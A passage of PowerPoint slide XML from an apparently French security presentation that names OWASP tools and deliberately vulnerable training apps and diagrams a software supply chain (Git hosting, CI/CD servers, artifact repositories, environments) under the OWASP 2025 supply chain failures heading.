              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>ModSecurity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>, WAF engine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Threat Dragon threat modeling tool</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Training / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>deliberately</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>vulnerable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> apps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Juice Shop, modern vulnerable web app</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>WebGoat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>, classic teaching app</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Security Shepherd, training platform</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="797352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DD5CAEAC-5FF1-49A9-FB33-1EB6EC934451}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>Artifact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t> repository</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 2" descr="Laptop - Free computer icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0A7F49D-CEDA-A69C-E795-2E0B1BB9A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1907" y="398018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omputer User Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA229DC-64A1-3C28-0A67-A9E668AB01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996" y="3928753"/>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510B108-4448-584B-98DE-4F0FEBAF8C7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="708995" y="3608499"/>
            <a:ext cx="162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sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="ZoneTexte 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{312A2F29-67DD-5968-4606-374A40927116}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2997299" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Git </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>hosting</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="ZoneTexte 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4197F436-9B68-5943-F8EA-619CACCE74C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5285603" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>CI/CD server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="ZoneTexte 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E48FFC5F-6896-1D63-BE8B-822A3832A505}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>Environments</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B027055-1F12-8023-5728-A04C88DF962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7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4257299"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18" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E64E33E5-899D-9422-4876-21845D2182DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378"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9" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD0B1EE3-0B75-71F2-0975-A3BB67206273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="298330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0" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FF6CCA8-9822-17B7-026C-B8E4A20C950A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5270226"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1" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{222F2DA7-4EA3-01EA-6572-25BE2BA803C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7557150"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2" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{949B3B62-9214-0952-5834-3E9B95D5188D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="984407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23" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14DE835D-AEEA-9024-0C6C-E33AB13F7B1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7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6545603"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cônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E384E84D-A866-8821-5661-9158148958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7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8833907"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Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED3ADEDD-DF1B-B74A-9477-2C34A792CA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7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="11122212"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26" name="Nuage 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95C94FBA-D78F-B992-4290-F90726B610D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796118" y="304956"/>
            <a:ext cx="7395882" cy="287121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D5FC046C-A840-4AA5-F27C-908077766201}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378" y="3319615"/>
            <a:ext cx="10875694"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A1DB742D-1D77-160D-7D4B-4D00C049810A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1258737"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Public repositories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1F58C00-6975-1811-4EFB-5D8F411A1FF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755715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31" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29829A64-D2D0-2417-77BB-54DDB5926A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34" t="7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="883390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a:xfrm>
            <a:off x="472251" y="349793"/>
            <a:ext cx="11124000" cy="257220"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Forge logicielle, Plateforme d’Intégration Continue, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Toolchain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" u="sng" dirty="0"/>
              <a:t>OWASP top 10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> vs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>A03:2025 Software Supply Chain Failures 1/2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="ZoneTexte 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C0EEA62-BCA7-898B-A594-768DAEAE162C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="4018376"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Production</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="ZoneTexte 32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76286828-63B3-EF29-1A3A-59E0A8466CBD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="4299772"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Qualification</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="ZoneTexte 33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0565DC4C-8864-401B-FFBC-275748762BAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="4581167"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Dev…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="ZoneTexte 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BEF6735-DB9E-FCAE-86FB-A5E1A3C13258}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4018376"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Nexus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="ZoneTexte 35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B7A6DE1-174B-F4AA-141B-69B4529B4F7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4312690"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Artifactory</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="ZoneTexte 36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7660C74C-8019-8B13-CA9B-6C079A981054}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4607005"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="ZoneTexte 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{950EAC1C-5F6B-662D-9D84-11F0F4A78D81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281843" y="4004139"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Jenkins</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="ZoneTexte 38">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{028E0F3A-0BAB-4D5D-17C9-BF89719A004C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281843" y="4298453"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GitLab</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> ci</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="ZoneTexte 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17BCE7EA-6D03-5781-F5DB-C7F35713AA75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281842" y="4592768"/>
            <a:ext cx="1535517" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>GitHub actions…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="ZoneTexte 40">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC1C30FF-9B7E-2AA5-835C-F300653F169D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3020823" y="4002359"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GitLab</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="ZoneTexte 41">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00E746E7-6ECE-9DDF-C858-4D96C1B39B44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3020823" y="4296673"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GiHub</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="ZoneTexte 42">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79D945CF-BDAB-6DFA-9F0D-50ECC72C4CA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3020822" y="4590988"/>
            <a:ext cx="1535517" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Bitbucket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="ZoneTexte 46">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CC849F3-52D5-3501-B8A3-3FA96B3DEC7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
